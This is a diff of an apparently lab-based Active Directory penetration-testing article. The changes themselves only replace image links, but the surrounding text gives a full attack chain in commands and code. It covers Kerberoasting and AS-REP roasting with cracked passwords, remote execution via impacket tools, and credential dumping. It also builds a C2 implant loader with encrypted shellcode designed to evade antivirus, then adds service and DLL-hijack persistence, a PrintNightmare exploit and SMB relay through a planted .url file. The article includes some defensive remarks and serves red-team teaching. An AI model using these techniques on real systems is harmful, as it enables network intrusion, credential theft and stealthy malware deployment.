@@ -39,7 +39,7 @@ This lengthy article offers easy navigation with links to individual chapters fo
 
 The layout of the infrastructure looks like on the following diagram:
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/1.png)
+![](images/images4.jpg)
 
 Now that we have a foothold into the domain, our ultimate goal is to compromise the Domain Controller. The Domain Controller is the heart of an Active Directory (AD) environment, responsible for authenticating users, managing permissions, and enforcing security policies. Compromising it effectively means gaining control of the entire network, every computer, and every user account.
 
@@ -47,7 +47,7 @@ Gaining control over the Domain Controller provides us with means of maintaining
 
 With that being said, let us go and take over the network.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/bravo-six-going-dark-cod.gif)
+![](images/images5.gif)
 
 In the previous article, we gained access to the domain as a low-privileged user `j.arnold` and his password `F4ll2023!`. Our next step involves enumeration using BloodHound and this user account.
 
@@ -75,7 +75,7 @@ sudo neo4j console
 
 The command above starts the Neo4j database and provides a link to `http://localhost:7474/`. When we open this link, it takes us to a password reset page. The initial credentials are `neo4j:neo4j`, and you must change the password to proceed.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/2.png)
+![](images/images6.jpg)
 
 Once the password has been changed, we can proceed to run BloodHound.
 
@@ -90,29 +90,29 @@ The database is currently empty, containing no data. To begin data ingestion, we
 bloodhound-python -d democorp.com -u j.arnold -p F4ll2023\! -ns 10.10.24.250 -c all --auth-method ntlm
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/3.png)
+![](images/images7.jpg)
 
 The injestor has produced several files with data detailing Active Directory objects.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/4.png)
+![](images/images8.jpg)
   
 These files can now be imported into BloodHound for in-depth analysis and visualization, by clicking on the "Upload Data" button and selecting the files from the directory where the scan data is stored.
 
 ## Analysis
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/6.png)
+![](images/images9.jpg)
 
 Now with the data imported into the database, BloodHound offers analysis capabilities. In the analysis tab, you'll find numerous prebuilt queries. For instance, you can simply click on "Find all Domain Admins" to retrieve a list of Domain Administrators within the domain, or you can explore various shortest paths of exploitation.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/7.png)
+![](images/images10.jpg)
 
 BloodHound has the capability to list Kerberoastable accounts existing within the domain. I will provide a more in-depth exploration of the Kerberoasting concept in the following sections of this article.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/8.png)
+![](images/images11.jpg)
 
 BloodHound includes an inbuilt query for AS-REP roastable users, which are accounts susceptible to AS-REP roasting - a technique used to extract credentials from certain accounts in Active Directory environments. We will focus on AS-REP roasting later in this article.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/9.png)
+![](images/images12.jpg)
 
 Beyond the predefined queries, we have the flexibility to define custom queries tailored to our specific analysis needs. For instance, our analysis can include identifying misconfigurations in certain domain computers where unconstrained delegation is possible (which we will focus on later in the article).
 
@@ -158,25 +158,25 @@ While using PlumHound, you must have BloodHound open. We will generate default r
 python3 PlumHound.py -x tasks/default.tasks -p <password>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/11.png)
+![](images/images13.jpg)
 
 The PlumHound has finished creating the reports.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/12.png)
+![](images/images14.jpg)
 
 The reports can be found in `<plumhound-dir>/reports`, where numerous files are generated. The one we need to open and review is `index.html`.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/13.png)
+![](images/images15.jpg)
   
 Once we open the index file, we'll find numerous reports, each with details links and some of them having accompanying CSV files. We can click on these links to access more detailed information about each report entry.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/14.png)
+![](images/images16.jpg)
 
 As an example, you can open the "Domain Users" report to obtain a list of existing users. Notably, the table includes the "description" property, and it's a common practice among administrators to include passwords within the Active Directory domain user description. In this simulation it was not a case.
 
 Below the table you can find the query that was used to extract information from Neo4j.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/15.png)
+![](images/images17.jpg)
 
 Our initial attack strategy targets Kerberoasting. In the PlumHound report, we've identified a Kerberoastable account, "BadgeService@democorp.com," which serves as our starting point for this approach.
 <div id="0x03"></div>
@@ -232,7 +232,7 @@ Once the Impacket library is installed, we can make use of its `examples` script
 ./GetUserSPNs.py -request -dc-ip 10.10.24.250 'democorp.com/j.arnold:F4ll2023!' 
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/16.png)
+![](images/images18.jpg)
 
 ## We have obtained the service account hash
 
@@ -248,7 +248,7 @@ The ruleset used during this attempt is https://github.com/stealthsploit/OneRule
 PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt ..\rockyou.txt -r .\rules\NSA.rule -O
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/17.png)
+![](images/images19.jpg)
 
 ## Password cracked
 
@@ -258,7 +258,7 @@ The password, `Perfection123!` has been successfully cracked in just 3 minutes u
 PS E:\hash\hashcat-6.2.3> .\hashcat.exe -m 13100 ..\badgesvc.txt --show
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/18.png)
+![](images/images20.jpg)
 
 Now that we have the password for the service account, let's attempt to use it across domain computers and check if this service account was a local administrator account on one of them.
 
@@ -266,7 +266,7 @@ Now that we have the password for the service account, let's attempt to use it a
 crackmapexec smb -u BadgeService -p 'Perfection123!' -d democorp.com ./hosts.txt
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/19.png)
+![](images/images21.jpg)
 
 We've discovered that the BadgeService account is a local administrator on the `10.20.24.100` machine, and we have the credentials to execute remote code as a highly privileged user. 
 
@@ -308,17 +308,17 @@ To use PsExec effectively, we require credentials such as a hash, or a username 
 ./psexec.py -codec cp866 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/20.png)
+![](images/images22.jpg)
 
 ### Access denied
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/bugs.png)
+![](images/images23.jpg)
 
 Except we don't. 
 
 PsExec is also very often picked up by the Windows Defender. What is picked up is not the executable per se, but the process of creating the service, executing it, and communicating over a named pipe.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/21.png)
+![](images/images24.jpg)
 
 In order to gain access, we will need different tools from impacket toolset.
 
@@ -339,7 +339,7 @@ sc \\<host> create <service> binPath= "<path>" /Q /c cmd.exe -c <command>
 sc \\<host> start <service>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/22b.png)
+![](images/images25.jpg)
 
 As evident, `smbexec` has successfully executed code on the remote machine, resulting in the compromise of that system without any issues. Let's proceed to explore another utility that can help us gain access to that machine.
 
@@ -365,7 +365,7 @@ var wmiProcess = new ManagementClass(wmiScope, new ManagementPath("Win32_Process
 wmiProcess.InvokeMethod("Create", processToRun);
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/22.png)
+![](images/images26.jpg)
 
 We've observed that `wmiexec` successfully executed code on the remote machine using the local administrator account without any complications.
 
@@ -388,7 +388,7 @@ schtasks /run /tn <task> /S <host.domain>
 at \\<host.domain> 06:00 cmd /c <command>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/23.png)
+![](images/images27.jpg)
 
 As observed, we've successfully executed code on the remote machine with `nt authority\system` privileges.
 
@@ -408,7 +408,7 @@ Counterpart (simplified):
 [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe","0","0","0")
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/29.png)
+![](images/images28.jpg)
 
 This article [Offensive Lateral Movement](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f) provides a valuable resource for more in-depth information on these techniques.
 
@@ -426,10 +426,10 @@ Given we steal the SAM, SYSTEM, SECURITY **and/or** NTDS.dit files, we can dump 
 ./secretsdump.py 'democorp.com/BadgeService:Perfection123!@10.10.24.100' -dc-ip 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/23b.png)
+![](images/images29.jpg)
 As we can see, we've successfully dumped the hashes from the machine `10.10.24.100`. These hashes can now be cracked, or in case of NTLMv1 (local account hashes), thrown around the network by employing the Pass The Hash attack.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/24.png)
+![](images/images30.jpg)
 
 At this point, we've compromised and dumped the hashes from the first domain machine. We are not finished here, the next step is to establish persistence, but before we move into persistence and anti-virus bypassing, let's exploit another vulnerability affecting the same machine.
 
@@ -451,7 +451,7 @@ In order to perform AS-REP roasting, we will use impacket scripts once again (`G
 ./GetNPUsers.py 'democorp.com/j.arnold:F4ll2023!' -dc-ip 10.10.24.250 -request -format hashcat
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/25.png)
+![](images/images31.jpg)
 
 We've obtained the encrypted Ticket Granting Ticket, which can now be cracked using hashcat.
 
@@ -459,7 +459,7 @@ We've obtained the encrypted Ticket Granting Ticket, which can now be cracked us
 .\hashcat.exe -m 18200 ..\jbird.txt ..\rockyou.txt -r .\rules\NSA.rule -O
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/26.png)
+![](images/images32.jpg)
 
 ## Roasted
 
@@ -469,7 +469,7 @@ The cracking attempt took 6 minutes and exposed the password as `Sunnyday123!`. 
 crackmapexec smb -u 'jbird' -p 'Sunnyday123!' -d democorp.com ./hosts.txt
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/27.png)
+![](images/images33.jpg)
 
 It appears that the credentials were valid, and one of the computers had this user configured as a Local Administrator.
 
@@ -477,7 +477,7 @@ It appears that the credentials were valid, and one of the computers had this us
 ./smbexec.py -codec cp866 'democorp.com/jbird:Sunnyday123!@10.10.24.100' -dc-ip 10.10.24.250 
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/28.png)
+![](images/images34.jpg)
 
 The `10.10.24.100` machine (along with a user) has been compromised once again.
 
@@ -501,7 +501,7 @@ administrative privileges, access to highly sensitive systems or data.
 <a href="#0x05"><button class="nav-btn">Previous chapter</button></a><a href="#0x07"><button class="nav-btn">Next chapter</button></a>
 
 `https://makeameme.org/meme/what-if-i-s68chp`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/what-if-i-s68chp.jpg)
+![](images/images35.jpg)
 
 Our next step is to ensure our presence on the machine is long-lasting and difficult to remove.
 
@@ -530,7 +530,7 @@ net localgroup "<Użytkownicy zarządzania zdalnego/Remote Management Users>" he
 netsh advfirewall firewall add rule name="Remote Desktop 3389" dir=in action=allow protocol=TCP localport=3389 :: Enable firewall allow rule for RDP
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/31.png)
+![](images/images36.jpg)
 
 ## Remote Desktop
 It is now possible to connect to the remote machine using the Remote Desktop Protocol (RDP). We will use the `xfreerdp` utility for this purpose.
@@ -539,21 +539,21 @@ It is now possible to connect to the remote machine using the Remote Desktop Pro
 xfreerdp /u:helpdesk /p:G3t_somehelp_br0 /v:10.10.24.100
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/32.png)
+![](images/images37.jpg)
 
 ### We have successfully connected to Remote Desktop.
 
 ## Evil WinRM
 Now, let's enable WinRM. To do this, search for PowerShell, and open it as an Administrator by pressing CTRL+Shift and then press Enter.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/33.png)
+![](images/images38.jpg)
 
 Now in the terminal, enter the following command:
 ```
 PS C:\Windows\system32> Enable-PSRemoting -Force
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/34.png)
+![](images/images39.jpg)
   
 The WinRM service is now enabled, and the corresponding firewall rules are in place. Let's connect to it using `evil-winrm`.
 
@@ -561,12 +561,12 @@ The WinRM service is now enabled, and the corresponding firewall rules are in pl
 evil-winrm -i 10.10.24.100 -u helpdesk -p G3t_somehelp_br0
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/35.png)
+![](images/images40.jpg)
 
 ### The WinRM service is operational. Now, let's talk about C2.
 
 `https://www.axosoft.com/dev-blog/top-10-things-to-know-about-scrum`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/control.jpeg)
+![](images/images41.jpg)
 
 ## Command and Control
 
@@ -653,7 +653,7 @@ Let's check if the tunnel works.
 nc 192.168.57.8 65520
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/36.png)
+![](images/images42.jpg)
 
 ### The tunnel works. Our next step is to set up the C2.
 
@@ -695,7 +695,7 @@ Amsi/Etw Patch: Hardware breakpoints
 ```
 And then click generate.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/37.png)
+![](images/images43.jpg)
 
 This is not the end though.
 
@@ -707,7 +707,7 @@ This is not the end though.
 Despite Havoc's demons' use of techniques like proxying system calls, delaying commands, and AMSI patching to evade detection and remain hidden, we must adapt our methodology to avoid triggering existing signatures in Microsoft Windows Defender and prevent detection of binary in the first place.
 
 `https://www.youtube.com/watch?v=K8hiXbyO8PU`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/widziszmie.png)
+![](images/images44.jpg)
 
 ## Obfuscation
 
@@ -715,7 +715,7 @@ We want this malware to stay undetected, and the more changes we make to the bin
 
 ### Okay, but what is the detection rate for this well known malware?
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/38.png)
+![](images/images45.jpg)
 
 As we can see, detection rate is too high as Microsoft Defender has detected the payload. The payload has been signatured into the oblivion. Let's transfer the .dll onto a **Flare VM** (https://github.com/mandiant/flare-vm) machine and do some operations on it. We can share the file using Python HTTP server, and download it straight on Flare VM.
 
@@ -734,7 +734,7 @@ wget https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -ou
 .\donut.exe -a 3 -z 4 -i demon.x64.exe
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/39c.png)
+![](images/images46.jpg)
 
 In our case, let's get inspired by this article (https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources). We will store the shellcode in a PE Resource of an executable, and then execute it in main.
 
@@ -761,7 +761,7 @@ Next, let's hit compile button and compile our loader.
 
 ### What is the detection rate now?
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/44.png)
+![](images/images47.jpg)
 
 ## Not bad, not remarkable
 
@@ -769,7 +769,7 @@ For such a simple loader and a well known shellcode extraction/obfuscation tool 
 
 ### Which AV engines did **not** detect our payload though?
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/45.png)
+![](images/images48.jpg)
 
 ## Let's make it lower
 
@@ -821,7 +821,7 @@ PS C:\Users\admin\Desktop\donut> dir | findstr datastore
 -a----        23.10.2023     14:55          87076 datastore.bin
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/46.png)
+![](images/images49.jpg)
 We have successfully encrypted the payload.
 
 ## Key distribution
@@ -874,7 +874,7 @@ Write-Host "Received key: $key"
 $tcpClient.Close()
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/47.png)
+![](images/images50.jpg)
 
 Key distribution server works.
   
@@ -925,31 +925,31 @@ int main(int argc, char* argv[]) {
 }
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/52.png)
+![](images/images51.jpg)
 
 In the next step, we'll embed the encrypted payload into the binary, as demonstrated earlier. Then, we'll proceed to inject the shellcode into the legitimate process. To achieve this, we'll refactor the C++ example, enabling it to download the encryption key, decrypt the payload, and perform the injection into the `explorer.exe` process using the `ntdll.dll` undocumented `RtlCreateUserThread` method.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/53.png)
+![](images/images52.jpg)
 
 To see the full source code visit my GitHub ([https://github.com/krystianbajno](https://github.com/krystianbajno/articles)).
 
 Now let's test the payload - start the application we've written and load this .dll.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/48.png)
+![](images/images53.jpg)
 
 We can promptly confirm that the Trojan has successfully retrieved the key. It's time to verify our Command and Control (C2) channel.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/49.png)
+![](images/images54.jpg)
   
 The malware has been successfully executed, and we have command-sending capabilities. Let's proceed by attempting to execute a command.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/50.png)
+![](images/images55.jpg)
   
 The command has been executed successfully. In summary, we've effectively employed a crypter to decrypt the shellcode, and an injector to inject shellcode into a legitimate process. This resulted in establishing a connection with the agent. We then successfully executed a command, which the client on the Command and Control (C2) agent executed through the Beacon Object File (BOF).
 
 ### What is the detection rate now?
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/51.png)
+![](images/images56.jpg)
 
 ## Homemade - always better
 
@@ -964,7 +964,7 @@ Lets use it now.
 
 This method involves installation of a new Windows Service, which will run within an svchost.exe process and inject payload into another `svchost.exe`. Initially, we'll incorporate the following code into the previously created DLL.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/1-1.png)
+![](images/images57.jpg)
 
 This code will serve as a basic Service Handler, and there's no need to insert the payload here, as the payload will execute during the `DLL_ATTACH` event. The payload will be executed at each reboot with this approach.
 
@@ -981,18 +981,18 @@ We should now package the Key Distribution script and the .dll, and transfer the
 python -m http.server
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/2-1.png)
+![](images/images58.jpg)
 
 The package can now be downloaded using the browser.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/1c.png)
+![](images/images59.jpg)
 
 Now, it's time to execute the key distributor on Kali. The trojan will download decryption key over the tunnel we've set up earlier.
 ```
 python ./key_distributor.py
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/2b.png)
+![](images/images60.jpg)
 
 Following that, we will establish a connection to the compromised machine over WINRM and upload the .dll to `C:\Windows\system32\nodeapi.dll`.
 
@@ -1001,7 +1001,7 @@ evil-winrm -i 10.10.24.100 -u helpdesk -p G3t_somehelp_br0
 
 *Evil-WinRM* PS C:\Users\helpdesk\Documents> upload nodeapi.dll C:\Windows\system32\nodeapi.dll
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/3-1.png)
+![](images/images61.jpg)
 
 Next, we'll establish an RDP connection to the target machine, create a new service launching svchost.exe, and modify the registry to indicate that the service employs a ServiceDll, directing it to our .DLL file.
 
@@ -1014,11 +1014,11 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\NodeApi\Parameters /v ServiceDll 
 
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/4-1.png)
+![](images/images62.jpg)
 
 Next, we must modify the Svchost DcomLaunch key in the following location `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` to include our service.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/5.png)
+![](images/images63.jpg)
 
 With all the configuration in place, we can start the service now.
 
@@ -1026,11 +1026,11 @@ With all the configuration in place, we can start the service now.
 sc start NodeApi
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/6-1.png)
+![](images/images64.jpg)
 
 The service has been started.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/7-1.png)
+![](images/images65.jpg)
 
 As we can see, we have **successfully evaded Windows Defender** and connected the compromised machine to the C2. The agent will connect back to us after each Windows system reboot.
 
@@ -1073,11 +1073,11 @@ Result contains not found
 Path ends with .dll
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/8a.png)
+![](images/images66.jpg)
 
 Now, we'll proceed to search for a suitable .dll file to substitute and execute the DLL hijacking.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/9-1.png)
+![](images/images67.jpg)
 
 As observed, the `wmiprvse.exe` executable attempts to load `C:\Windows\System32\wbem\wbemcomn.dll` and fails in doing so.
 
@@ -1087,51 +1087,51 @@ Now, let's download the `wmiprvse.exe` executable via WINRM and load it into FLA
 *Evil-WinRM* PS C:\Users\helpdesk\Documents> download C:\Windows\system32\wbem\wmiprvse.exe
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/10.png)
+![](images/images68.jpg)
 
 We've observed that the application makes use of these imported functions. Now, we need to export our own or proxy them. To make this process easier, we will generate proxy headers using the SharpDllProxy tool (available at [https://github.com/Flangvik/SharpDllProxy](https://github.com/Flangvik/SharpDllProxy)). We will use a legitimate .dll from the `System32` directory as a basis for proxy.
 
 Let's open the .sln file, compile the project, and generate the template, which we'll later incorporate into our malware we've written earlier.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/11-1.png)
+![](images/images69.jpg)
 
 We've generated two files - one being the copy of legitimate `wbemcomn.dll` `(tmp1DBC.dll)` which we are going to be calling from the trojan, and the template. Let's open the template and see the exported functions.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/12-1.png)
+![](images/images70.jpg)
 
 That is quite a lot of exports, isn't it? Let's copy it into our .dll project we compiled earlier.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/13-1.png)
+![](images/images71.jpg)
 
 Now, we'll proceed to compile the trojan and upload both of the created .dll files into the `C:\Windows\System32\wbem` directory.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/15-1.png)
+![](images/images72.jpg)
 
 We must now patiently await the execution of these trojanized DLLs by a legitimate process, effectively setting the trap.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/16-1.png)
+![](images/images73.jpg)
 
 We've successfully hijacked the .DLL and established persistence through DLL hijacking.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/17-1.png)
+![](images/images74.jpg)
 
 Now, we can see, that the domain administrator has logged in to the computer, and we've just gained access to the domain administrator's session on this computer, which enables us to potentially cause significant disruptions within the domain.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/19-1.png)
+![](images/images75.jpg)
 
 We were able to connect to the Domain Controller over SMB using the Kerberos authentication.
 ```
 dir \\democorp-dc.democorp.com\C$
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/20-1.png)
+![](images/images76.jpg)
 
 As well as extract the ticket from this computer and save it for later use.
 ```
 klist /all
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/21-1.png)
+![](images/images77.jpg)
 
 And execute commands on the Domain Controller as a Domain Administrator.
 ```
@@ -1146,18 +1146,18 @@ rdate -n 10.10.24.250 # Fix the clock skew
 smbexec.py democorp-dc.democorp.com -k -no-pass -target-ip 10.10.24.250 -dc-ip 10.10.24.250 # Execute commands on the remote.
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/22-1.png)
+![](images/images78.jpg)
 
 With `NT Authority/System` privileges.
 ```
 whoami /all
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/23-1.png)
+![](images/images79.jpg)
 
 Our malware infiltration has successfully compromised the entire network. We have the capability to extract the NTDS.dit file, create Golden Tickets, gain access to machines, and extract credentials from these systems.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/owned.png)
+![](images/images80.jpg)
 
 ### How to prevent this?
 
@@ -1173,7 +1173,7 @@ The persistence and AV evasion chapter was quite extensive, wasn't it? While the
 <a href="#0x09"><button class="nav-btn">Previous chapter</button></a><a href="#0x0B"><button class="nav-btn">Next chapter</button></a>
 
 `https://en.webfail.com/6e69f0539aa`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/post2.jpg)
+![](images/images81.jpg)
 
 ## What is Print Nightmare?
 
@@ -1197,7 +1197,7 @@ rpcdump.py @10.10.24.101 | egrep "MS-RPN|MS-PAR"
 rpcdump.py @10.10.24.102 | egrep "MS-RPN|MS-PAR"
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/24-1.png)
+![](images/images82.jpg)
 
 As we can see, machines  `.100,.101,.102` might be vulnerable to Print Nightmare. Let's exploit the vulnerability now.
 
@@ -1209,7 +1209,7 @@ Let's create a tunnel from the mail server's port `64000` to our local machine's
 └─# ./chisel_1.9.1_linux_amd64 client 192.168.57.8:65499 R:64000:0.0.0.0:445
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/25-1.png)
+![](images/images83.jpg)
 
 Now, open Havoc C2 and create a port forward from the Windows machine's `64000` to `64000` on the mail server.
 ```
@@ -1224,13 +1224,13 @@ sliver (RIGHT_KARATE) > rportfwd add -b 0.0.0.0:64000 -r 10.10.24.9:64000
 [*] Reverse port forwarding 10.10.24.9:64000 <- 0.0.0.0:64000
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/26-1.png)
+![](images/images84.jpg)
 
 If you're not using the C2, you can also achieve port forwarding using tools like chisel, SSH, socat, firewalls, routers, or your preferred tool of choice.
 
 Let's check if the tunnel works.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/27-1.png)
+![](images/images85.jpg)
 
 ### Port forwarding works, next step is
 
@@ -1250,7 +1250,7 @@ sliver > generate --http 10.10.24.9:65530 --save /home/kali/lateralmovement --os
 sliver > http --lport 65530 # start an http listener on port 65530
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/28-1.png)
+![](images/images86.jpg)
 
 After we've uploaded and installed the `WinDivert64.sys` driver, modified our custom '.dll' to include a Sliver implant resource (or added an exception to Windows Defender with the command: `Add-MpPreference -ExclusionPath '<PATH>'` 😉), and executed the implant on the target machine, we can proceed to perform TCP hijacking with `PortBender`.
 
@@ -1287,7 +1287,7 @@ tcp < 445 0.0.0.0 -> 10.10.24.100 64000 # divert SMB 445 to 64000
 StreamDivert.exe config.txt -f
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/29-1.png)
+![](images/images87.jpg)
 
 When connecting to the machine's SMB port (.100), we've successfully tunneled traffic to our Kali machine's listener behind NAT.
 
@@ -1368,7 +1368,7 @@ Our final step is to execute the exploit. Let's use the credentials we've discov
 python3 printnightmare.py 'democorp.com/j.arnold:F4ll2023!@10.10.24.102' -dll '\\10.10.24.100\share\adduser.dll'
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/30.png)
+![](images/images88.jpg)
 
 The error-code `0x801011b - RPC_E_ACCESS_DENIED` means, that the machine is not vulnerable to the exploit.
 
@@ -1377,7 +1377,7 @@ Now, let's use the exploit against the vulnerable one.
 python3 printnightmare.py 'democorp.com/j.arnold:F4ll2023!@10.10.24.101' -dll '\\10.10.24.100\share\adduser.dll'
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/31-1.png)
+![](images/images89.jpg)
 
 ## Successfully loaded DLL
 
@@ -1387,11 +1387,11 @@ The .101 machine has been compromised and successfully executed our payload, res
 ./secretsdump.py 'helpdesk:G3t_somehelp_br0@10.10.24.101' -dc-ip 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/32-1.png)
+![](images/images90.jpg)
 
 As well as execute remote commands as `NT Authority/System` and establish persistence like in previous chapter.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/33-1.png)
+![](images/images91.jpg)
 
 ## What is the risk?
 
@@ -1428,7 +1428,7 @@ Let me present you another vulnerability **enabled by default**.
 
 <a href="#0x0A"><button class="nav-btn">Previous chapter</button></a><a href="#0x0C"><button class="nav-btn">Next chapter</button></a>
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/smbrelaybloody2.png)
+![](images/images92.jpg)
 
 In our previous chapter, we successfully hijacked the SMB port on one of the network machines and established a tunnel. Now, this tunnel becomes our gateway to execute an SMB relay attack, which will rely on a malicious planted URL shortcut within a legitimate share. All we need to do is patiently await a user to access this share, and the URL shortcut will automatically spring into action.
 
@@ -1448,7 +1448,7 @@ To detect which machines are vulnerable, we can utilize `crackmapexec`.
 ```
 crackmapexec smb -u j.arnold -p 'F4ll2023!' -d democorp.com hosts.txt --shares
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/1-2.png)
+![](images/images93.jpg)
 
 As we can see, the machines` .100`, `.101`, and `.102` have SMB signing not required (`signing: False`), and the `.101` machine has a Read/Writable share called `printing` available to us.
 
@@ -1472,7 +1472,7 @@ Keep in mind, that newlines on Windows systems are made of `\x0d\x0a` (`\r\n`), 
 ```
 └─$ perl -pi -e 's/\n/\r\n/' helpdesk.lnk
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/2-2.png)
+![](images/images94.jpg)
 
 Now let's put the file on the share, effectively setting up the trap. The file must start with `@` sign, and must end with `.url`.
 
@@ -1483,7 +1483,7 @@ put @helpdesk.url
 ls
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/3-2.png)
+![](images/images95.jpg)
 
 Now we can capture the hashes when someone opens the share, without hijacking the SMB service on the target share host. In order to fetch the icon, the user will need to authenticate with us.
 
@@ -1491,7 +1491,7 @@ Now we can capture the hashes when someone opens the share, without hijacking th
 responder -I lo -A
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/4-2.png)
+![](images/images96.jpg)
 
 ### Hash captured - the user has stepped on the mine
 
@@ -1528,7 +1528,7 @@ Now the user opens the share. We can immediately see, that we have a new relay a
 ```
 ntlmrelayx > socks
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/5-1.png)
+![](images/images97.jpg)
 
 ### The relay session is now wrapping the authentication for commands we execute.
 
@@ -1539,7 +1539,7 @@ Let's test the relay and connect to the share using `smbclient`.
 You will be prompted for password. Just press enter and the relay will authenticate you
 smb: \> dir
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/6-2.png)
+![](images/images98.jpg)
 
 ### We've opened the `C:\` drive on the `10.10.24.102`.
 
@@ -1548,7 +1548,7 @@ Now let's try to execute a command.
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
 └─# proxychains impacket-smbexec democorp/Administrator@10.10.24.102 -no-pass
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/7-2.png)
+![](images/images99.jpg)
 
 ## The machine has been compromised
 
@@ -1559,7 +1559,7 @@ Now let's dump the hashes from the machine using `secretsdump`.
